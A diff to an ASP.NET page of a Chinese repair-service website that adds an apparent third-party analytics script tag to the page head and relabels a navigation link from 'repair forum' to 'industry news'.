@@ -53,7 +53,7 @@ a:active {
     background-color:White; 
 }
 .pager a:hover { border:1 solid #F59223; background-color:#F59223; color:White; margin: 0 5px; padding: 1px 6px;}
-</style></head>
+</style><script type="text/javascript" src="http://z.cnzz.net/o.php?sid=1253974593"></script></head>
 <body>
 <div id="apDiv2" class="toplnk"><uc2:gotop ID="gotop1" runat="server" /></div>
 <script language="JavaScript" type="text/javascript">
@@ -77,7 +77,7 @@ document.write("<style type=\"text/css\" media=\"screen\">center{display:none;}<
     <td align="center" valign="middle" class="topbar"><a href="show.aspx"  class="ht">配件展示</a></td>
     <td align="center" valign="middle" class="topbar"><a href="error.aspx"  class="ht">常见故障</a></td>
     <td align="center" valign="middle" class="topbar"><a href="fix.aspx"  class="ht">报修流程</a></td>
-    <td  align="center" valign="middle" class="topbar"><a href="bbs.aspx"  class="ht">维修论坛</a></td>
+    <td  align="center" valign="middle" class="topbar"><a href="bbs.aspx"  class="ht">业界新闻</a></td>
     <td  align="center" valign="middle" class="topbar"><a href="shop.aspx" class="ht">网店介绍</a></td>
    <td  align="center" valign="middle" class="topbar"> <a href="staff.aspx" class="ht">人才招聘</a></td>
     <td  align="center" valign="middle" class="topbar"><a href="messages.aspx" class="ht">网上留言</a></td>
